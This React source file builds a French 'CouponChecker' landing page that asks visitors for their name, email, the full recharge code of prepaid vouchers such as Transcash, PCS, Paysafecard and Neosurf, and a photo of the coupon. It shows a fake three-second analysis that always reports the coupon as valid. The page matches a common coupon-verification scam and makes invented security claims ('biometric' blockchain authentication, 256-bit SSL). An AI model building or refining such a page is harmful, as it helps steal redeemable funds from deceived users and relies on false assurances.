import { useState, useRef } from "react";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { z } from "zod";
import { motion } from "framer-motion";
import Autoplay from "embla-carousel-autoplay";
import { 
  ShieldCheck, 
  CreditCard, 
  Eye, 
  EyeOff, 
  CheckCircle2, 
  Loader2, 
  Lock,
  Menu,
  ChevronRight,
  Gift,
  Smartphone,
  ShoppingCart,
  Gamepad2,
  Music,
  Upload,
  Image as ImageIcon,
  X,
  Sparkles
} from "lucide-react";
import {
  Form,
  FormControl,
  FormField,
  FormItem,
  FormLabel,
  FormMessage,
} from "@/components/ui/form";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import { Checkbox } from "@/components/ui/checkbox";
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from "@/components/ui/card";
import {
  Carousel,
  CarouselContent,
  CarouselItem,
} from "@/components/ui/carousel";

// Schema de validation
const formSchema = z.object({
  firstName: z.string().min(2, "Le prénom est requis"),
  lastName: z.string().min(2, "Le nom est requis"),
  email: z.string().email("Email invalide"),
  couponType: z.string().min(1, "Veuillez sélectionner un type de coupon"),
  amount: z.string().min(1, "Veuillez sélectionner un montant"),
  couponCode: z.string().min(10, "Code coupon invalide (trop court)"),
  couponImage: z.any().refine((files) => files && files instanceof File, "La photo du coupon est requise"),
});

const COUPON_TYPES = [
  { id: "transcash", name: "Transcash", domain: "transcash.fr", color: "from-red-500 to-red-900" },
  { id: "pcs", name: "PCS", domain: "mypcs.com", color: "from-slate-700 to-black" },
  { id: "paysafecard", name: "Paysafecard", domain: "paysafecard.com", color: "from-blue-500 to-blue-900" },
  { id: "neosurf", name: "Neosurf", domain: "neosurf.com", color: "from-pink-500 to-rose-900" },
  { id: "googleplay", name: "Google Play", domain: "play.google.com", color: "from-emerald-400 to-emerald-900" },
  { id: "amazon", name: "Amazon", domain: "amazon.com", color: "from-yellow-500 to-orange-700" },
  { id: "itunes", name: "iTunes", domain: "apple.com", color: "from-blue-400 to-purple-600" },
  { id: "steam", name: "Steam", domain: "steampowered.com", color: "from-slate-800 to-slate-950" },
  { id: "toneofirst", name: "Toneo First", domain: "toneofirst.com", color: "from-orange-400 to-orange-800" },
  { id: "ticketpremium", name: "Ticket Premium", domain: "ticket-premium.com", color: "from-blue-600 to-indigo-900" },
  { id: "flexpin", name: "Flexpin", domain: "flexepin.com", color: "from-green-500 to-teal-800" },
  { id: "cashlib", name: "Cashlib", domain: "cashlib.com", color: "from-amber-500 to-orange-800" },
  { id: "applegift", name: "Apple Gift", domain: "apple.com", color: "from-gray-300 to-gray-500" },
  { id: "crypto", name: "Crypto Voucher", domain: "bitcoin.org", color: "from-yellow-400 to-orange-500" },
];

const AMOUNTS = ["5", "10", "15", "20", "25", "50", "100", "150", "200", "250", "300", "350", "500"];

export default function Home() {
  const [showCode, setShowCode] = useState(false);
  const [isAnalyzing, setIsAnalyzing] = useState(false);
  const [result, setResult] = useState<null | "success" | "error">(null);
  const [isMobileMenuOpen, setIsMobileMenuOpen] = useState(false);
  const [selectedFile, setSelectedFile] = useState<File | null>(null);
  const [previewUrl, setPreviewUrl] = useState<string | null>(null);

  const form = useForm<z.infer<typeof formSchema>>({
    resolver: zodResolver(formSchema),
    defaultValues: {
      firstName: "",
      lastName: "",
      email: "",
      couponType: "",
      amount: "",
      couponCode: "",
    },
  });

  function onSubmit(values: z.infer<typeof formSchema>) {
    setIsAnalyzing(true);
    setResult(null);
    
    // Simulation d'analyse
    setTimeout(() => {
      setIsAnalyzing(false);
      setResult("success");
      console.log(values);
      console.log("File:", selectedFile);
    }, 3000);
  }

  const handleFileChange = (e: React.ChangeEvent<HTMLInputElement>, onChange: (value: any) => void) => {
    const file = e.target.files?.[0];
    if (file) {
      setSelectedFile(file);
      onChange(file);
      const url = URL.createObjectURL(file);
      setPreviewUrl(url);
    }
  };

  const removeFile = () => {
    setSelectedFile(null);
    setPreviewUrl(null);
    form.setValue("couponImage", undefined);
  };

  const plugin = useRef(
    Autoplay({ delay: 2000, stopOnInteraction: false })
  );

  return (
    <div className="min-h-screen font-sans text-white overflow-x-hidden selection:bg-purple-500/30 selection:text-white relative">
      
      {/* Background Ambience */}
      <div className="fixed inset-0 z-0 pointer-events-none">
        <div className="absolute top-[-20%] right-[-10%] w-[800px] h-[800px] bg-purple-600/10 rounded-full blur-[120px] mix-blend-screen animate-pulse duration-[10000ms]"></div>
        <div className="absolute bottom-[-20%] left-[-10%] w-[600px] h-[600px] bg-cyan-600/10 rounded-full blur-[100px] mix-blend-screen animate-pulse duration-[8000ms]"></div>
      </div>

      {/* 1. Header Futuriste */}
      <header className="fixed top-0 w-full z-50 transition-all duration-300 border-b border-white/5 bg-[#050B14]/70 backdrop-blur-xl">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 h-20 flex items-center justify-between">
          {/* Logo */}
          <div className="flex items-center gap-3 group cursor-pointer">
            <div className="relative">
              <div className="absolute inset-0 bg-gradient-to-r from-cyan-500 to-purple-600 rounded-lg blur opacity-40 group-hover:opacity-75 transition-opacity"></div>
              <div className="relative bg-[#0A101F] p-2 rounded-lg border border-white/10">
                <ShieldCheck className="w-6 h-6 text-cyan-400" />
              </div>
            </div>
            <span className="font-display font-bold text-xl tracking-tight bg-clip-text text-transparent bg-gradient-to-r from-white to-white/70">
              CouponChecker
            </span>
          </div>

          {/* Desktop Menu */}
          <nav className="hidden md:flex items-center gap-8 text-sm font-medium text-white/70">
            {["Comment ça marche", "Sécurité", "Support"].map((item) => (
              <a 
                key={item} 
                href={`#${item.toLowerCase().replace(/\s+/g, '-')}`} 
                className="hover:text-white transition-all hover:scale-105 relative py-1"
              >
                {item}
                <span className="absolute bottom-0 left-0 w-0 h-[1px] bg-gradient-to-r from-cyan-500 to-purple-500 transition-all duration-300 group-hover:w-full"></span>
              </a>
            ))}
          </nav>

          {/* Mobile Menu Button */}
          <button 
            className="md:hidden p-2 text-white/70 hover:text-white transition-colors"
            onClick={() => setIsMobileMenuOpen(!isMobileMenuOpen)}
          >
            <Menu className="w-6 h-6" />
          </button>
        </div>

        {/* Mobile Menu Dropdown */}
        {isMobileMenuOpen && (
          <motion.div 
            initial={{ opacity: 0, y: -20 }}
            animate={{ opacity: 1, y: 0 }}
            className="md:hidden absolute top-20 left-0 w-full bg-[#0A101F] border-b border-white/10 p-4 flex flex-col gap-4 backdrop-blur-xl"
          >
             {["Comment ça marche", "Sécurité", "Support"].map((item) => (
               <a key={item} href="#" className="text-white/80 font-medium py-2 hover:text-cyan-400 transition-colors">{item}</a>
             ))}
          </motion.div>
        )}
      </header>

      <main className="pt-32 pb-20 lg:pt-40 lg:pb-32 max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 relative z-10">
        <div className="flex flex-col lg:flex-row items-start gap-16 lg:gap-24">
          
          {/* 2. Hero Section - Left Column */}
          <div className="flex-1 w-full lg:w-[55%] space-y-10">
            <motion.div
              initial={{ opacity: 0, y: 30 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ duration: 0.8, ease: "easeOut" }}
            >
              <div className="inline-flex items-center gap-2 px-4 py-1.5 rounded-full bg-white/5 border border-white/10 text-cyan-300 text-xs font-bold uppercase tracking-widest mb-8 backdrop-blur-md shadow-[0_0_15px_rgba(34,211,238,0.1)]">
                <Sparkles className="w-3 h-3" />
                Vérification Sécurisée 2026
              </div>
              
              <h1 className="text-5xl md:text-6xl lg:text-7xl font-display font-bold leading-[1.05] tracking-tight mb-8 text-white">
                Vérifiez vos coupons <br/>
                <span className="bg-clip-text text-transparent bg-gradient-to-r from-cyan-400 via-purple-400 to-pink-400 animate-gradient-text">
                  instantanément.
                </span>
              </h1>
              
              <p className="text-lg md:text-xl text-white/60 leading-relaxed max-w-lg mb-12 font-light">
                La technologie de vérification la plus avancée. Authentification biométrique des coupons en temps réel via blockchain sécurisée.
              </p>

              {/* Carousel Néon */}
              <div className="w-full relative mt-16">
                <div className="absolute left-0 top-0 bottom-0 w-24 bg-gradient-to-r from-[#050B14] to-transparent z-20 pointer-events-none"></div>
                <div className="absolute right-0 top-0 bottom-0 w-24 bg-gradient-to-l from-[#050B14] to-transparent z-20 pointer-events-none"></div>
                
                <Carousel
                  opts={{
                    align: "start",
                    loop: true,
                  }}
                  plugins={[plugin.current]}
                  className="w-full"
                >
                  <CarouselContent className="-ml-4">
                    {COUPON_TYPES.map((coupon) => (
                      <CarouselItem key={coupon.id} className="pl-4 basis-1/3 md:basis-1/3 lg:basis-1/4">
                        <div className="group cursor-pointer relative perspective-1000">
                          <div className={`relative aspect-[1.586/1] rounded-2xl overflow-hidden transition-all duration-500 transform group-hover:-translate-y-2 group-hover:shadow-[0_0_30px_rgba(139,92,246,0.3)] border border-white/10 bg-gradient-to-br ${coupon.color} bg-opacity-20`}>
                             {/* Dark overlay for contrast */}
                             <div className="absolute inset-0 bg-black/40 backdrop-blur-[1px]"></div>
                             
                             <div className="absolute inset-0 flex items-center justify-center p-6 z-10">
                               <img 
                                 src={`https://logo.clearbit.com/${coupon.domain}?size=200`}
                                 alt={coupon.name}
                                 className="w-full h-full object-contain filter brightness-0 invert opacity-70 group-hover:opacity-100 group-hover:scale-110 transition-all duration-500 drop-shadow-[0_0_10px_rgba(255,255,255,0.3)]"
                                 onError={(e) => {
                                   e.currentTarget.style.display = 'none';
                                   e.currentTarget.parentElement!.innerHTML = `<span class="text-sm font-bold text-white/90 tracking-wider">${coupon.name}</span>`;
                                 }}
                               />
                             </div>
                             
                             {/* Glossy shine */}
                             <div className="absolute -inset-full top-0 block h-full w-1/2 -skew-x-12 bg-gradient-to-r from-transparent to-white opacity-10 group-hover:animate-shine" />
                          </div>
                          <p className="mt-4 text-xs font-medium text-center text-white/40 group-hover:text-cyan-400 transition-colors tracking-wider uppercase">
                            {coupon.name}
                          </p>
                        </div>
                      </CarouselItem>
                    ))}
                  </CarouselContent>
                </Carousel>
              </div>
            </motion.div>
          </div>

          {/* 3. Hero Section - Right Column (Glass Form) */}
          <motion.div 
            className="flex-1 w-full lg:w-[45%]"
            initial={{ opacity: 0, x: 30 }}
            animate={{ opacity: 1, x: 0 }}
            transition={{ duration: 0.8, delay: 0.2, ease: "easeOut" }}
          >
            <div className="relative group">
              {/* Form Glow Halo */}
              <div className="absolute -inset-0.5 bg-gradient-to-r from-cyan-500 to-purple-600 rounded-3xl blur opacity-30 group-hover:opacity-50 transition duration-1000"></div>
              
              <Card className="relative glass-card border-0 rounded-3xl overflow-hidden">
                <CardHeader className="border-b border-white/10 pb-6 pt-8 px-8">
                  <div className="flex items-center justify-between">
                    <div>
                      <CardTitle className="text-xl font-display font-bold text-white tracking-wide">Vérification</CardTitle>
                      <CardDescription className="text-white/40 mt-1">Sécurisé par SSL 256-bit</CardDescription>
                    </div>
                    <div className="h-10 w-10 rounded-full bg-green-500/10 flex items-center justify-center border border-green-500/20 shadow-[0_0_15px_rgba(34,197,94,0.2)]">
                      <Lock className="w-5 h-5 text-green-400" />
                    </div>
                  </div>
                </CardHeader>
                <CardContent className="pt-8 px-8 pb-8">
                  {!isAnalyzing && !result && (
                    <Form {...form}>
                      <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-6">
                        
                        <div className="grid grid-cols-2 gap-5">
                          <FormField
                            control={form.control}
                            name="firstName"
                            render={({ field }) => (
                              <FormItem>
                                <FormLabel className="text-white/60 text-xs uppercase tracking-wider font-semibold">Prénom</FormLabel>
                                <FormControl>
                                  <Input placeholder="Jean" {...field} className="bg-white/5 border-white/10 text-white placeholder:text-white/20 focus:border-cyan-500/50 focus:ring-0 focus:bg-white/10 transition-all h-12 rounded-xl backdrop-blur-md neon-border-focus" />
                                </FormControl>
                                <FormMessage />
                              </FormItem>
                            )}
                          />
                          <FormField
                            control={form.control}
                            name="lastName"
                            render={({ field }) => (
                              <FormItem>
                                <FormLabel className="text-white/60 text-xs uppercase tracking-wider font-semibold">Nom</FormLabel>
                                <FormControl>
                                  <Input placeholder="Dupont" {...field} className="bg-white/5 border-white/10 text-white placeholder:text-white/20 focus:border-cyan-500/50 focus:ring-0 focus:bg-white/10 transition-all h-12 rounded-xl backdrop-blur-md neon-border-focus" />
                                </FormControl>
                                <FormMessage />
                              </FormItem>
                            )}
                          />
                        </div>

                        <FormField
                          control={form.control}
                          name="email"
                          render={({ field }) => (
                            <FormItem>
                              <FormLabel className="text-white/60 text-xs uppercase tracking-wider font-semibold">Email</FormLabel>
                              <FormControl>
                                <Input placeholder="jean.dupont@exemple.com" {...field} className="bg-white/5 border-white/10 text-white placeholder:text-white/20 focus:border-cyan-500/50 focus:ring-0 focus:bg-white/10 transition-all h-12 rounded-xl backdrop-blur-md neon-border-focus" />
                              </FormControl>
                              <FormMessage />
                            </FormItem>
                          )}
                        />

                        <div className="grid grid-cols-2 gap-5">
                          <FormField
                            control={form.control}
                            name="couponType"
                            render={({ field }) => (
                              <FormItem>
                                <FormLabel className="text-white/60 text-xs uppercase tracking-wider font-semibold">Service</FormLabel>
                                <Select onValueChange={field.onChange} defaultValue={field.value}>
                                  <FormControl>
                                    <SelectTrigger className="bg-white/5 border-white/10 text-white focus:border-cyan-500/50 focus:ring-0 h-12 rounded-xl neon-border-focus">
                                      <SelectValue placeholder="Choisir..." />
                                    </SelectTrigger>
                                  </FormControl>
                                  <SelectContent className="bg-[#0A101F] border-white/10 text-white backdrop-blur-xl">
                                    {COUPON_TYPES.map((type) => (
                                      <SelectItem key={type.id} value={type.id} className="focus:bg-white/10 focus:text-cyan-400">{type.name}</SelectItem>
                                    ))}
                                  </SelectContent>
                                </Select>
                                <FormMessage />
                              </FormItem>
                            )}
                          />

                          <FormField
                            control={form.control}
                            name="amount"
                            render={({ field }) => (
                              <FormItem>
                                <FormLabel className="text-white/60 text-xs uppercase tracking-wider font-semibold">Montant</FormLabel>
                                <Select onValueChange={field.onChange} defaultValue={field.value}>
                                  <FormControl>
                                    <SelectTrigger className="bg-white/5 border-white/10 text-white focus:border-cyan-500/50 focus:ring-0 h-12 rounded-xl neon-border-focus">
                                      <SelectValue placeholder="XX €" />
                                    </SelectTrigger>
                                  </FormControl>
                                  <SelectContent className="bg-[#0A101F] border-white/10 text-white backdrop-blur-xl">
                                    {AMOUNTS.map((amount) => (
                                      <SelectItem key={amount} value={amount} className="focus:bg-white/10 focus:text-cyan-400">{amount} €</SelectItem>
                                    ))}
                                  </SelectContent>
                                </Select>
                                <FormMessage />
                              </FormItem>
                            )}
                          />
                        </div>

                        <FormField
                          control={form.control}
                          name="couponCode"
                          render={({ field }) => (
                            <FormItem>
                              <FormLabel className="text-white/60 text-xs uppercase tracking-wider font-semibold">Code de Recharge</FormLabel>
                              <div className="relative">
                                <FormControl>
                                  <Input 
                                    type={showCode ? "text" : "password"} 
                                    placeholder="XXXX-XXXX-XXXX-XXXX" 
                                    {...field} 
                                    className="bg-white/5 border-white/10 text-white placeholder:text-white/20 focus:border-cyan-500/50 focus:ring-0 focus:bg-white/10 transition-all pr-12 font-mono tracking-wider h-12 rounded-xl backdrop-blur-md neon-border-focus text-lg" 
                                  />
                                </FormControl>
                                <button
                                  type="button"
                                  onClick={() => setShowCode(!showCode)}
                                  className="absolute right-4 top-1/2 -translate-y-1/2 text-white/40 hover:text-cyan-400 transition-colors p-1"
                                >
                                  {showCode ? <EyeOff size={20} /> : <Eye size={20} />}
                                </button>
                              </div>
                              <FormMessage />
                            </FormItem>
                          )}
                        />

                        <FormField
                          control={form.control}
                          name="couponImage"
                          render={({ field: { value, onChange, ...fieldProps } }) => (
                            <FormItem>
                              <FormLabel className="text-white/60 text-xs uppercase tracking-wider font-semibold">Photo du coupon <span className="text-red-400">*</span></FormLabel>
                              <FormControl>
                                <div className="space-y-3">
                                  {!selectedFile ? (
                                    <div className="relative group">
                                      <Input
                                        {...fieldProps}
                                        type="file"
                                        accept="image/*"
                                        className="hidden"
                                        id="file-upload"
                                        onChange={(e) => handleFileChange(e, onChange)}
                                      />
                                      <label
                                        htmlFor="file-upload"
                                        className="flex flex-col items-center justify-center w-full h-32 border border-dashed border-white/20 rounded-xl cursor-pointer bg-white/5 hover:bg-white/10 hover:border-cyan-500/50 hover:shadow-[0_0_20px_rgba(6,182,212,0.1)] transition-all duration-300 backdrop-blur-sm"
                                      >
                                        <div className="flex flex-col items-center justify-center pt-5 pb-6">
                                          <div className="p-3 bg-white/5 rounded-full shadow-inner mb-3 group-hover:scale-110 transition-transform border border-white/10">
                                            <Upload className="w-5 h-5 text-cyan-400" />
                                          </div>
                                          <p className="mb-1 text-sm text-white/70 font-medium">Glissez ou cliquez pour uploader</p>
                                          <p className="text-xs text-white/30">PNG, JPG (Max. 5MB)</p>
                                        </div>
                                      </label>
                                    </div>
                                  ) : (
                                    <div className="relative flex items-center gap-4 p-3 bg-white/5 border border-white/10 rounded-xl backdrop-blur-sm">
                                      <div className="h-14 w-14 rounded-lg overflow-hidden bg-black/20 flex-shrink-0 border border-white/5">
                                        {previewUrl ? (
                                          <img src={previewUrl} alt="Preview" className="h-full w-full object-cover" />
                                        ) : (
                                          <ImageIcon className="h-6 w-6 m-auto mt-4 text-white/30" />
                                        )}
                                      </div>
                                      <div className="flex-1 min-w-0">
                                        <p className="text-sm font-medium text-white/90 truncate">
                                          {selectedFile.name}
                                        </p>
                                        <p className="text-xs text-white/40 font-mono">
                                          {(selectedFile.size / 1024 / 1024).toFixed(2)} MB
                                        </p>
                                      </div>
                                      <button
                                        type="button"
                                        onClick={removeFile}
                                        className="p-2 hover:bg-white/10 rounded-full text-white/40 hover:text-red-400 transition-colors"
                                      >
                                        <X className="w-5 h-5" />
                                      </button>
                                    </div>
                                  )}
                                </div>
                              </FormControl>
                              <FormMessage />
                            </FormItem>
                          )}
                        />

                        <div className="flex items-center space-x-3 pt-2">
                          <Checkbox 
                            id="hide-code" 
                            checked={!showCode}
                            onCheckedChange={(checked) => setShowCode(!checked)}
                            className="border-white/20 data-[state=checked]:bg-cyan-500 data-[state=checked]:border-cyan-500 data-[state=checked]:text-[#050B14]"
                          />
                          <label
                            htmlFor="hide-code"
                            className="text-sm font-medium leading-none text-white/60 cursor-pointer select-none"
                          >
                            Masquer le code lors de la saisie
                          </label>
                        </div>

                        <Button type="submit" className="w-full h-14 text-base font-bold tracking-wide shadow-[0_0_20px_rgba(124,58,237,0.3)] hover:shadow-[0_0_30px_rgba(124,58,237,0.5)] transition-all duration-300 bg-gradient-to-r from-cyan-600 via-blue-600 to-purple-600 hover:scale-[1.02] text-white rounded-xl mt-4 border border-white/10">
                          Vérifier le coupon <ChevronRight className="ml-2 w-5 h-5" />
                        </Button>
                        
                        <p className="text-xs text-center text-white/30 mt-6 flex items-center justify-center gap-2">
                           <Lock className="w-3 h-3" /> Connexion chiffrée SSL 256-bit
                        </p>
                      </form>
                    </Form>
                  )}

                  {isAnalyzing && (
                    <div className="py-20 flex flex-col items-center justify-center text-center space-y-10">
                      <div className="relative">
                        <div className="absolute inset-0 bg-cyan-500/30 rounded-full blur-3xl animate-pulse"></div>
                        <div className="relative bg-[#0A101F] p-6 rounded-full border border-cyan-500/30 shadow-[0_0_30px_rgba(6,182,212,0.2)]">
                           <Loader2 className="h-12 w-12 text-cyan-400 animate-spin" />
                        </div>
                      </div>
                      <div className="space-y-3 max-w-xs mx-auto">
                        <h3 className="text-2xl font-display font-bold text-white tracking-wide">Analyse en cours...</h3>
                        <p className="text-white/50 text-sm leading-relaxed">Vérification de l'authenticité auprès des serveurs sécurisés.</p>
                      </div>
                      <div className="w-full max-w-[240px] bg-white/5 h-1.5 rounded-full overflow-hidden">
                        <motion.div 
                          className="h-full bg-gradient-to-r from-cyan-400 via-blue-500 to-purple-600"
                          initial={{ width: "0%" }}
                          animate={{ width: "100%" }}
                          transition={{ duration: 3, ease: "easeInOut" }}
                        />
                      </div>
                    </div>
                  )}

                  {result === "success" && (
                    <motion.div 
                      initial={{ opacity: 0, scale: 0.95 }}
                      animate={{ opacity: 1, scale: 1 }}
                      className="py-16 flex flex-col items-center justify-center text-center space-y-8"
                    >
                      <div className="bg-green-500/10 p-6 rounded-full text-green-400 mb-4 shadow-[0_0_30px_rgba(34,197,94,0.2)] border border-green-500/20">
                        <CheckCircle2 className="h-16 w-16" />
                      </div>
                      <div className="space-y-3">
                        <h3 className="text-3xl font-display font-bold text-white">Coupon Valide</h3>
                        <p className="text-white/60 max-w-xs mx-auto">Le code a été authentifié avec succès. Les fonds sont disponibles.</p>
                      </div>
                      <Button 
                        variant="outline" 
                        className="mt-6 border-white/10 hover:bg-white/5 text-white h-12 px-8 rounded-xl"
                        onClick={() => {
                          setResult(null);
                          form.reset();
                          removeFile();
                        }}
                      >
                        Nouvelle vérification
                      </Button>
                    </motion.div>
                  )}

                </CardContent>
              </Card>
            </div>
          </motion.div>
        </div>
      </main>

      {/* 4. Footer */}
      <footer className="w-full py-12 border-t border-white/5 bg-[#050B14] relative z-10">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 flex flex-col md:flex-row justify-between items-center gap-8">
          <div className="flex items-center gap-3 opacity-60 hover:opacity-100 transition-opacity">
             <ShieldCheck className="w-5 h-5 text-cyan-500" />
             <span className="font-semibold text-white tracking-wide">CouponChecker © 2026</span>
          </div>
          
          <div className="flex gap-8 text-sm text-white/40">
            <a href="#" className="hover:text-cyan-400 transition-colors hover:underline decoration-cyan-500/30 underline-offset-4">Conditions d'utilisation</a>
            <a href="#" className="hover:text-cyan-400 transition-colors hover:underline decoration-cyan-500/30 underline-offset-4">Politique de confidentialité</a>
          </div>
        </div>
      </footer>
    </div>
  );
}
